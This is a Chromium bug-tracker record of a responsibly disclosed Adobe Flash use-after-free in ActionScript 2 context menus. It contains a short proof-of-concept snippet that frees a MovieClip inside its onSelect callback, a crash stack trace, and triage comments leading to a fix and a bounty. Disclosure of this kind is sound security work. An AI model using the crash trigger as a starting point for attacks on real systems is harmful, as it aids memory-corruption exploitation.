# Security: Adobe Flash ContextMenu Use After Free

| Field | Value |
|-------|-------|
| **Issue ID** | [40084647](https://issues.chromium.org/issues/40084647) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **Reporter** | xi...@gmail.com |
| **Assignee** | na...@google.com |
| **Created** | 2016-06-22 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**

This is a use after free bug when using Action Script 2 context menu.  

By setting a MovieClip object as the ContextMenu and free the object in a callback function, we can cause the MovieClip object to be reused after it is freed.

var mc = this.createEmptyMovieClip("mc", 0);

mc.onSelect = function(){  

trace(233);  

\_root.removeMovieClip.call(mc);  

}

\_root.menu = mc;

**VERSION**  

Chrome Version: 52.0.2743.41 beta-m (64-bit)  

Operating System: Windows 7 en

**REPRODUCTION CASE**

To reproduce the case, open "TestContextMenu.swf" in chrome, then right-click the mouse to observe the crash.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

Crash State:

(1430.1a5c): Access violation - code c0000005 (first chance)  

First chance exceptions are reported before any exception handling.  

This exception may be expected and handled.  

00000000`00000000 ?? ???

0:000> k  

Child-SP RetAddr Call Site  

00000000`0025ccd8 000007fe`d3dade34 0x0  

00000000`0025cce0 000007fe`d3db1550 pepflashplayer!PPP\_ShutdownBroker+0x24c884  

00000000`0025ce10 000007fe`d3db331e pepflashplayer!PPP\_ShutdownBroker+0x24ffa0  

00000000`0025cf30 000007fe`d3b72704 pepflashplayer!PPP\_ShutdownBroker+0x251d6e  

00000000`0025d030 000007fe`d3b750ce pepflashplayer!PPP\_ShutdownBroker+0x11154  

00000000`0025d070 000007fe`d3b6ce4b pepflashplayer!PPP\_ShutdownBroker+0x13b1e  

00000000`0025d320 000007fe`d3b6cf31 pepflashplayer!PPP\_ShutdownBroker+0xb89b  

00000000`0025d380 000007fe`d3b6c3bc pepflashplayer!PPP\_ShutdownBroker+0xb981  

00000000`0025d3b0 000007fe`d95e5f30 pepflashplayer!PPP\_ShutdownBroker+0xae0c  

00000000`0025d3e0 000007fe`d9a1afd7 chrome\_child!ChromeMain+0x7015d4  

00000000`0025d410 000007fe`d9a1b196 chrome\_child!ChromeMain+0xb3667b  

00000000`0025d510 000007fe`d95e6327 chrome\_child!ChromeMain+0xb3683a  

00000000`0025d560 000007fe`d95e66ea chrome\_child!ChromeMain+0x7019cb  

00000000`0025d590 000007fe`d7a8fa64 chrome\_child!ChromeMain+0x701d8e  

00000000`0025d5c0 000007fe`d7a47e0f chrome\_child!GetHandleVerifier+0x49d44  

00000000`0025d6b0 000007fe`d7a48db2 chrome\_child!GetHandleVerifier+0x20ef  

00000000`0025e9c0 000007fe`d7a91450 chrome\_child!GetHandleVerifier+0x3092  

00000000`0025eeb0 000007fe`d7a911ad chrome\_child!GetHandleVerifier+0x4b730  

00000000`0025ef10 000007fe`d7a470e1 chrome\_child!GetHandleVerifier+0x4b48d  

00000000`0025ef60 000007fe`d9d505e2 chrome\_child!GetHandleVerifier+0x13c1

Credit:  

Yuki Chen of Qihoo 360Vulcan Team

## Attachments

- [adobe flash contextMenu use after free.zip](attachments/adobe flash contextMenu use after free.zip) (application/octet-stream, 7.8 KB)

## Timeline

### do...@chromium.org (2016-06-23)

Thanks for the report. +natashenka@google.com - are you the right person to take a look at this?

[Monorail components: Internals>Plugins>Flash]

### na...@google.com (2016-06-23)

Absolutely, I'll report this now! 

### na...@google.com (2016-06-23)

This is PSIRT-5524

### do...@chromium.org (2016-06-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-07-08)

natashenka: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ta...@google.com (2016-07-13)

[Empty comment from Monorail migration]

### ta...@google.com (2016-07-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-07-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-07-22)

natashenka: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ra...@chromium.org (2016-08-02)

natashenka: any updates here? Thanks!

### oc...@chromium.org (2016-08-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-01)

[Empty comment from Monorail migration]

### na...@google.com (2016-09-22)

Fixed in the September update

### aw...@chromium.org (2016-09-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-25)

[Empty comment from Monorail migration]

### di...@chromium.org (2016-09-26)

Your change meets the bar and is auto-approved for M54 (branch: 2840)

### aw...@chromium.org (2016-10-07)

Nothing to merge here.

### aw...@chromium.org (2016-10-10)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-11)

Congratulations, the panel has awarded you $3,000 for this bug!

### aw...@chromium.org (2016-10-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-30)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2016-12-30)

This issue was migrated from crbug.com/chromium/622271?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084647)*
